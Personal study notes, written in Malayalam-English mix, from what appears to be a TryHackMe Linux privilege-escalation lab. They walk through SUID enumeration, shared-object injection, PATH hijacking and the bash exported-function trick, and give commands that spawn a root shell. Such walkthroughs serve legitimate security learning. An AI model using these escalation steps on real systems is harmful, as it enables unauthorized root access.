#### Known exploits
1) Find all the SUID/SGID executables:
  -->find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
ivide we  find /usr/sbin/exim-4.84-3 - a vulnerable binary.so ithinte known exploit exploit-db il ninum edukuka enit ith just ./execute chythal mathi aayi

====================================================

#### shared object injection
2) epozhum suid,sgid nokan -  -->find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null   command adikanam.ivide executable file il onn shared object call chyunathayi kanam
-->ath run chyth nokuka         -->/usr/local/bin/suid-so
ini strace command use chyth system calling nokam
-->strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
-->ivide strace enna toolin ee shared object find chyan patunila enn thonunu.
-->so nammal ithe name il ulla oru shared object undakunu
-->shared object undakanengi c code il chyth compile aatum chyanam
-->Create the **.config** directory for the libcalc.so file:
         -->mkdir /home/user/.config
-->ivide namuk already compile chyanulla c code author thanitund.ath oru bash shell spawn chyth tharum
   -->gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
-->ini -->cd /home/user/.config adich -->ls adichal kanam libcalc.so enna file
-->ini nerthe pole aa binary run chyuka -->/usr/local/bin/suid-so

=========================================================

#### Environment Variables
-->nerthe pole suid,sgid executeble file kanthethuka enit athil env enoke avasanikuna files note chyuka
-->aadyam ath execute chyuka.so aa path angane eduth terminalil copy paste chyuth nokuka - /usr/local/bin/suid-env
-->strings enn koduth aa path copy paste chyth nokuka apol kanam service apache2 start enn.so ivide just service,apache2 enn mathrame koduthitulu full path koduthitila so aa file environment variable il rely chyunu ennanartham so namal ath exploit chyuka
-->nammal service edukunu.service in absoulte path onum ilathathkond thane
-->so nammal thane puthiya service binary undakunu.so angane suid-env file namude service binary run chyum
-->so aadyam namal oru c code(service.c) undakanam that spawns a bash shell enit ath compile chyanam.nammal compile chyunath enthinanenal executable aakan aanen thonunu
-->`gcc -o service /home/user/tools/suid/service.c` so compiled aayi.note: -o ititt name service enn thane kodukanam
-->ini ->echo $PATH enna koduth enviroment variable path nokuka
-->avide namuk puthuthayi oru variable PATH undakam.enit athil ee executable service idam.anganeee suid-env file run chyumbol namal undakiya path aadyam ullath kondthane athile service file run chyum
-->so puthiya path undaka: -->PATH=/home/user:$PATH   , ->echo $PATH  adich nokiyal kanam puthiya path ayath
-->ini nerthe pole -->/usr/local/bin/suid-env adikuka apol namuk shell kitum.karanam nammal puthuthayi akiya pathil thane aan service binary ulath so engotum ini matendathila

#### Abusing Shell Features-1
-->aadyam suid ulla executable file kandethuka and it is run by root(root run chyanamenath nirtbandamano en arila)
-->strings /usr/local/bin/suid-env2
   ivide /usr/sbin/service apache2 start ennan undavuka.so ivide full path und so environment variable ine rely chyunila
-->/bin/bash/ --version       adich bash inte version nokuka.4.2 in thazhe aanegil ath vulnerable aan
-->function /usr/sbin/service { /bin/bash -p; }   - ivide /usr/sbin/service ennath replace chyuny.ith call chyumbol curly brace il ula bash aakum. -p ennal permission preserve chyuka enathan.karanam ee file root aayit run chyunond ith idanam.ini namuk ee /usr/sbin/service original ilek(/usr/sbin/service) export chyanam:
-->export -f /usr/sbin/service    - ipol namal undakiya function adangiya /usr/sbin/service originalil replace aayi
-->ini namuk aa executabel file run chyam:
    -->/usr/local/bin/suid-env2
	>id          //root
	
#### Abusing Shell Features-2
-->/bin/bash --version 4.4 in thazhe ulla version ilum vulnerability und
-->pakse ithine pati tryhackme il nokit valuthayit manasilavunil
-->ento ps4 environment variable oke paryunund
-->sambavam /bin/bash adich root spawn chyunath thane aan